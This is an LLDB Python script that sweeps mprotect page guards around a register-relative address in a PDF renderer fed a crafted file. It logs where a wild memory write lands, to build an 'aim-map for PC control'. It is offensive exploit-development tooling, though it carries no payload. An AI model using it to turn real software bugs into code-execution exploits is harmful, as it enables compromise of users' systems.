# RIP-15: write-footprint map — for L=31472 sweep mprotect guards across ALL deltas
# below x27; every SIGSEGV code=2 hit = a page the wild-write strikes. Output = the
# aim-map for PC control (which in-arena offsets the cascade can reach).
import os, sys, time
import lldb
t = lldb.debugger.GetSelectedTarget()
CWD = os.getcwd()
TRACE = open(os.path.join(CWD, "rip15_trace.txt"), "a")
def T(s): print(s); TRACE.write(s+"\n"); TRACE.flush()

L = 31472
DS = list(range(0x1000, 0x20001, 0x1000))
hits = []
for D in DS:
    old = t.GetProcess()
    if old and old.IsValid() and old.GetState() in (lldb.eStateRunning, lldb.eStateStopped, lldb.eStateSuspended):
        old.Kill(); time.sleep(0.25)
    bpe = t.BreakpointCreateByName("aa_cache_render")
    p = t.LaunchSimple([f"k2_d{L}.pdf", "f.png"], None, CWD)
    if not p or not p.IsValid():
        T("d=%#x launch fail" % D); continue
    th = p.GetSelectedThread()
    if p.GetState() != lldb.eStateStopped:
        T("d=%#x no entry" % D); continue
    pc = th.GetSelectedFrame().GetPCAddress().GetLoadAddress(t)
    bpw = t.BreakpointCreateByAddress(pc + 1804)
    bpw.SetOneShot(True)
    x27 = 0
    for _ in range(4):
        p.Continue()
        st = p.GetState()
        while st == lldb.eStateRunning:
            time.sleep(0.1); st = p.GetState()
        if st != lldb.eStateStopped: break
        x27 = p.GetSelectedThread().GetSelectedFrame().FindRegister("x27").GetValueAsUnsigned()
        if x27: break
    if not x27:
        T("d=%#x no x27" % D); continue
    page = (x27 - D) & ~0xFFF
    v = t.EvaluateExpression('(int)mprotect((void*)%d, 4096, 1)' % page)
    if v.GetValueAsSigned() != 0:
        t.BreakpointDelete(bpe.GetID())
        T("d=%#x unmapped" % D)
        continue
    p.Continue()
    st = p.GetState()
    while st == lldb.eStateRunning:
        time.sleep(0.1); st = p.GetState()
    res = "survive"
    if st == lldb.eStateStopped:
        th2 = p.GetSelectedThread()
        desc = (th2.GetStopDescription(200) or "?")
        fr = th2.GetSelectedFrame()
        sym = fr.GetSymbol()
        off = -1
        if sym:
            off = fr.GetPCAddress().GetLoadAddress(t) - sym.GetStartAddress().GetLoadAddress(t)
        fa = 0
        if "address=" in desc:
            try: fa = int(desc.split("address=")[1].split(")")[0], 16)
            except Exception: pass
        res = "WRITE-HIT +%d fa=%x" % (off, fa)
        hits.append((D, off, fa, x27))
        p.Kill()
    t.BreakpointDelete(bpe.GetID())
    T("d=%#x %s" % (D, res))
T("=== FOOTPRINT: %d pages hit: %s" % (len(hits), [(hex(d), o, hex(f)) for d, o, f, _ in hits]))
T("=== x27s: %s" % [hex(x) for _, _, _, x in hits])
TRACE.close()
